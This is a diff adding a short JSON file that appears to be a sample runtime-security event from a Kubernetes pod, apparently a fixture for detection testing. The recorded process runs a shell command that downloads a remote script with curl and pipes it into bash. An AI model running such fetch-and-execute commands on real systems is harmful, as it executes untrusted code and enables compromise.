@@ -1,0 +1,10 @@
+{
+  "process_exec": {
+    "process": {
+      "binary": "/bin/sh",
+      "arguments": "-c curl http://example.com/a.sh | bash",
+      "pod": {"namespace": "default", "name": "web-demo-abc"},
+      "container": {"name": "web"}
+    }
+  }
+}
